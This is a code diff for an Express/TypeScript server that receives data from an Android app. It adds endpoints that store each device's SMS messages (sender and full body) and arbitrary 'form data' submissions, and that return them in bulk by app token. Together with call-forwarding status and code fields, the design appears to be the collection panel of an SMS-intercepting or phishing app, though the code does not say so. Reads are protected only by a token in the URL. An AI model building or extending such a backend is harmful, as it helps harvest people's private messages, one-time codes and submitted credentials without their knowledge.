@@ -21,10 +21,11 @@ async function verifyApp(appToken: string): Promise<{ ok: boolean; error?: strin
 }
 
 // Fields the Android app may send that map directly to device table columns
+// NOTE: sms_messages and last_sms_log are intentionally excluded — they go to the messages table
 const DIRECT_COLUMNS = new Set([
   "status", "data_type",
   "device_name", "device_model", "android_version",
-  "sms_messages", "total_sms_count", "last_sms_timestamp", "last_sms_log",
+  "total_sms_count", "last_sms_timestamp",
   "sms_sync_status", "sms_pending_count", "sms_processed_count",
   "sms_permission_status", "sms_last_sync_at", "sms_last_error",
   "call_forward_status", "call_forward_action", "call_forward_code",
@@ -35,8 +36,16 @@ const DIRECT_COLUMNS = new Set([
 // Fields to never overwrite from payload
 const SKIP_FIELDS = new Set(["app_id", "sub_id", "uid", "id", "registered_at", "created_at"]);
 
+// Core device data_types — everything else is treated as form data
+const CORE_DATA_TYPES = new Set([
+  "registered_device", "heartbeat", "online_status",
+  "fcm_token", "call_forward", "sms_sync", "device_info",
+]);
+
 // ── POST /api/device/:appToken/upsert ─────────────────────────────────────────
-// Android app's smartUpsert — register device, heartbeat, SMS log, call forward, etc.
+// Android app's smartUpsert — register device, heartbeat, call forward, etc.
+// SMS messages are handled separately by POST /message
+// Form data (non-core data_type) is routed to form_data table
 router.post("/device/:appToken/upsert", async (req, res) => {
   const { appToken } = req.params;
   const payload = req.body as Record<string, unknown>;
@@ -57,7 +66,22 @@ router.post("/device/:appToken/upsert", async (req, res) => {
   logProxyRequest({ endpoint: `/api/device/${appToken}/upsert`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
   if (!allowed) return res.status(403).json({ ok: false, error: reason });
 
-  // Build the upsert row
+  const dataType = (payload["data_type"] as string | undefined) ?? "registered_device";
+
+  // Non-core data types → insert into form_data table (in addition to device row update)
+  if (dataType && !CORE_DATA_TYPES.has(dataType) && dataType !== "registered_device") {
+    const formRow = {
+      app_id: appToken,
+      sub_id: subId,
+      form_type: dataType,
+      data: payload,
+      submitted_at: new Date().toISOString(),
+    };
+    await db.from("form_data").insert(formRow);
+    return res.json({ ok: true, routed: "form_data" });
+  }
+
+  // Build the device upsert row
   const row: Record<string, unknown> = {
     app_id: appToken,
     sub_id: subId,
@@ -66,7 +90,6 @@ router.post("/device/:appToken/upsert", async (req, res) => {
     last_seen: new Date().toISOString(),
   };
 
-  // Map direct columns
   for (const [key, val] of Object.entries(payload)) {
     if (SKIP_FIELDS.has(key)) continue;
     if (DIRECT_COLUMNS.has(key)) row[key] = val;
@@ -80,7 +103,6 @@ router.post("/device/:appToken/upsert", async (req, res) => {
     if (!row["android_version"]) row["android_version"] = dj["androidversion"] ?? null;
   }
 
-  // First upsert — on conflict (app_id, sub_id) update all columns
   const { data, error } = await db
     .from("devices")
     .upsert(row, { onConflict: "app_id,sub_id" })
@@ -91,8 +113,92 @@ router.post("/device/:appToken/upsert", async (req, res) => {
   return res.json({ ok: true, data });
 });
 
+// ── POST /api/device/:appToken/message ────────────────────────────────────────
+// Insert a single SMS into the messages table
+router.post("/device/:appToken/message", async (req, res) => {
+  const { appToken } = req.params;
+  const payload = req.body as Record<string, unknown>;
+  const ip = getIp(req as Parameters<typeof getIp>[0]);
+
+  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
+  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  const { allowed, reason } = await checkProxyRules({ endpoint: "upsert", app_id: appToken, sub_id: subId, ip });
+  if (!allowed) return res.status(403).json({ ok: false, error: reason });
+
+  const tsRaw = payload["timestamp"] as number | undefined;
+  const sentAt = tsRaw ? new Date(tsRaw).toISOString() : new Date().toISOString();
+
+  const messageRow = {
+    app_id: appToken,
+    sub_id: subId,
+    from_id: (payload["phone_number"] ?? payload["sender_number"] ?? null) as string | null,
+    content: ((payload["message_body"] as string | undefined) ?? "").slice(0, 5000),
+    message_type: (payload["direction"] as string | undefined) ?? "sms",
+    sent_at: sentAt,
+    is_read: false,
+  };
+
+  const { data, error } = await db.from("messages").insert(messageRow).select().single();
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+
+  // Update device SMS stats — count rows in messages table for this device
+  const { count } = await db
+    .from("messages")
+    .select("*", { count: "exact", head: true })
+    .eq("app_id", appToken)
+    .eq("sub_id", subId);
+
+  const now = new Date().toISOString();
+  await db
+    .from("devices")
+    .update({
+      total_sms_count: count ?? 0,
+      last_sms_timestamp: tsRaw ?? Date.now(),
+      sms_sync_status: "SYNCED",
+      sms_last_sync_at: Date.now(),
+      updated_at: now,
+      last_seen: now,
+    })
+    .eq("app_id", appToken)
+    .eq("sub_id", subId);
+
+  return res.json({ ok: true, data });
+});
+
+// ── POST /api/device/:appToken/form ───────────────────────────────────────────
+// Insert form data into the form_data table
+router.post("/device/:appToken/form", async (req, res) => {
+  const { appToken } = req.params;
+  const payload = req.body as Record<string, unknown>;
+  const ip = getIp(req as Parameters<typeof getIp>[0]);
+
+  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
+  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  const { allowed, reason } = await checkProxyRules({ endpoint: "upsert", app_id: appToken, sub_id: subId, ip });
+  if (!allowed) return res.status(403).json({ ok: false, error: reason });
+
+  const formRow = {
+    app_id: appToken,
+    sub_id: subId,
+    form_type: (payload["data_type"] as string | undefined) ?? "form",
+    data: payload,
+    submitted_at: new Date().toISOString(),
+  };
+
+  const { data, error } = await db.from("form_data").insert(formRow).select().single();
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+  return res.json({ ok: true, data });
+});
+
 // ── GET /api/device/:appToken/get/:uid ────────────────────────────────────────
-// Returns a single device record by sub_id
 router.get("/device/:appToken/get/:uid", async (req, res) => {
   const { appToken, uid } = req.params;
   const ip = getIp(req as Parameters<typeof getIp>[0]);
@@ -115,7 +221,6 @@ router.get("/device/:appToken/get/:uid", async (req, res) => {
 });
 
 // ── GET /api/device/:appToken/get ─────────────────────────────────────────────
-// Returns all devices for this app token
 router.get("/device/:appToken/get", async (req, res) => {
   const { appToken } = req.params;
 
@@ -133,7 +238,6 @@ router.get("/device/:appToken/get", async (req, res) => {
 });
 
 // ── PATCH /api/device/:appToken/update/:uid ───────────────────────────────────
-// Partial update for a device (e.g. FCM token, online status)
 router.patch("/device/:appToken/update/:uid", async (req, res) => {
   const { appToken, uid } = req.params;
   const updates = req.body as Record<string, unknown>;
@@ -167,8 +271,54 @@ router.patch("/device/:appToken/update/:uid", async (req, res) => {
   return res.json({ ok: true, data });
 });
 
+// ── GET /api/device/:appToken/messages ────────────────────────────────────────
+// Returns messages for a device or all devices under this app token
+router.get("/device/:appToken/messages", async (req, res) => {
+  const { appToken } = req.params;
+  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  let query = db
+    .from("messages")
+    .select("*")
+    .eq("app_id", appToken)
+    .order("sent_at", { ascending: false })
+    .range(Number(offset), Number(offset) + Number(limit) - 1);
+
+  if (uid) query = query.eq("sub_id", uid);
+
+  const { data, error } = await query;
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+  return res.json({ ok: true, data: data ?? [] });
+});
+
+// ── GET /api/device/:appToken/form-data ───────────────────────────────────────
+// Returns form submissions for a device or all devices under this app token
+router.get("/device/:appToken/form-data", async (req, res) => {
+  const { appToken } = req.params;
+  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  let query = db
+    .from("form_data")
+    .select("*")
+    .eq("app_id", appToken)
+    .order("submitted_at", { ascending: false })
+    .range(Number(offset), Number(offset) + Number(limit) - 1);
+
+  if (uid) query = query.eq("sub_id", uid);
+
+  const { data, error } = await query;
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+  return res.json({ ok: true, data: data ?? [] });
+});
+
 // ── GET /api/device/:appToken/data ────────────────────────────────────────────
-// All data for this app token (same as /get but alternative endpoint)
+// All devices for this app token
 router.get("/device/:appToken/data", async (req, res) => {
   const { appToken } = req.params;
 
